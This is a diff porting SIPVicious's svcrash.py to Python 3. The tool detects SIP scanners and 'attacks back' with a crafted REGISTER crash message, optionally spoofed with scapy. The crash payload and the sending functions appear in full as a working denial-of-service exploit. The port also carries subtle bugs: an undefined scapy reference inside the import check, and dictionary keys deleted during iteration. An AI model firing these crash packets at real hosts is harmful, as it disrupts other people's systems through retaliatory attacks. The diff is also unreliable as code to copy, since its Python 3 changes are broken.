@@ -1,11 +1,11 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # svcrash.py - SIPvicious crash breaks svwar and svcrack
 
 __GPL__ = """
 
    Sipvicious crash exploits a bug in svwar/svcrack.py to stop unauthorized
    scans from flooding the network.
-   Copyright (C) 2012  Sandro Gauci <sandro@enablesecurity.com>
+   Copyright (C) 2007-2020  Sandro Gauci <sandro@enablesecurity.com>
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
@@ -21,34 +21,26 @@ __GPL__ = """
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 """
 
-import logging #not used
-import optparse
-import os.path
-import random #not used
 import re
-import select #not used
-import socket
 import sys
 import time
+import logging
+import optparse
+import os.path
+import random
+import select
+import socket
 import warnings
-
-from libs.svhelper import __author__, __version__ #not used
-
-__prog__ = 'svcrash'
+try:
+    from scapy.layers.inet import IP, UDP
+    from scapy.all import send, Raw, sniff
+    scapyversion = scapy.__version__
+except ImportError:
+    scapyversion = 0
+from .libs.svhelper import __author__, __version__
 warnings.filterwarnings("ignore")
 
-scapyversion = 0
-try:
-    from scapy.all import *
-    scapyversion = 2
-except ImportError:
-    pass
-try:
-    from scapy import *
-    scapyversion = 1
-except ImportError:
-    pass
-
+__prog__ = 'svcrash'
 
 def getArgs():
     parser = optparse.OptionParser(
@@ -57,11 +49,9 @@ def getArgs():
                       dest="auto", default=False, action="store_true",)
     parser.add_option('--astlog', help="Path for the asterisk full logfile",
                       dest="astlog")
-    parser.add_option('-d', help="specify attacker's ip address", dest="ipaddr",
-                      )
+    parser.add_option('-d', help="specify attacker's ip address", dest="ipaddr")
     parser.add_option('-p', help="specify attacker's port", dest="port",
-                      type="int", default=5060
-                      )
+                      type="int", default=5060)
     parser.add_option('-b', help="bruteforce the attacker's port", dest="bruteforceport",
                       default=False, action="store_true")
     (options, args) = parser.parse_args()
@@ -72,7 +62,7 @@ def getArgs():
     elif options.auto:
         if scapyversion == 0:
             parser.error(
-                "You need to install scapy from http://www.secdev.org/projects/scapy/")
+                "You should have scapy installed for spoofing the packets: python3 -m pip install scapy.")
     elif options.astlog:
         if not os.path.exists(options.astlog):
             parser.error("Could not read %s" % options.astlog)
@@ -85,14 +75,13 @@ def getArgs():
                 "You either need have port 5060 available or install scapy from http://www.secdev.org/projects/scapy/")
     return options, args
 
-
 class asteriskreadlognsend:
-
     def __init__(self, logfn):
+        self.log = None
         self.logfn = logfn
         self.lastsent = 30
         self.matchcount = 0
-        self.log = None
+        self.origlogsize = 0
 
     def checkfile(self):
         if (self.log is None) or (self.origlogsize > os.path.getsize(self.logfn)):
@@ -132,9 +121,7 @@ class asteriskreadlognsend:
         except KeyboardInterrupt:
             return
 
-
 class sniffnsend:
-
     def __init__(self, port=5060):
         self.port = port
         self.lastsent = 30
@@ -151,6 +138,7 @@ class sniffnsend:
         if not src in self.mytimer:
             # print "add %s:%s" % src
             self.mytimer[src] = time.time() - 2
+
         if time.time() - self.mytimer[src] > 2:
             if time.time() - self.lastsent > 0.5:
                 if ('User-Agent: friendly-scanner' in data) or \
@@ -160,8 +148,9 @@ class sniffnsend:
                         self.lastsent = time.time()
                         self.mytimer[src] = time.time()
                         sendattack2(ipaddr, port)
+
         if len(self.mytimer) > 0:
-            for src in list(self.mytimer.keys()):
+            for src in self.mytimer.keys():
                 if time.time() - self.mytimer[src] > 10:
                     # print "del %s:%s:%s" %
                     # (str(src),time.time(),self.mytimer[src])
@@ -180,24 +169,21 @@ crashmsg += '"100"<sip:100@localhost>; tag=683a653a7901746865726501627965\r\nUs'
 crashmsg += 'er-agent: Telkom Box 2.4\r\nTo: "100"<sip:100@localhost>\r\nCse'
 crashmsg += 'q: 1 REGISTER\r\nCall-id: 469585712\r\nMax-forwards: 70\r\n\r\n'
 
-
 def sendattack(ipaddr, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.bind(('0.0.0.0', 5060))
     dst = ipaddr, port
-    s.sendto(crashmsg, dst)
+    s.sendto(bytes(crashmsg, 'utf-8'), dst)
     sys.stdout.write("Attacking back %s:%s\r\n" % (ipaddr, port))
     s.close()
-
 
 def sendattack2(ipaddr, port):
     packet = IP(dst=ipaddr) / UDP(sport=5060, dport=port) / crashmsg
     sys.stdout.write("Attacking back %s:%s\r\n" % (ipaddr, port))
     send(packet, verbose=0)
 
-
 def main():
-    options, args = getArgs()
+    options, _ = getArgs()
     if options.auto:
         sns = sniffnsend()
         sns.start()
